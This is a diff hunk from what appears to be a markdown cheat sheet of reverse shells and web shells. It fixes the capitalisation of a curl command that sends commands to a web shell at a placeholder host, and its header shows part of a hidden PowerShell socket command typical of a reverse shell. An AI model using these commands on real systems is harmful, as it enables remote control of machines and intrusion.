@@ -18,7 +18,7 @@ powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sock
 ## Web Shell 
 - web browser/curl
 ```
-Curl http://{YOURWEBSITE}/payload.php?cmd={COMMANDS}
+curl http://{YOURWEBSITE}/payload.php?cmd={COMMANDS}
 ```
 Payloads:
 ```
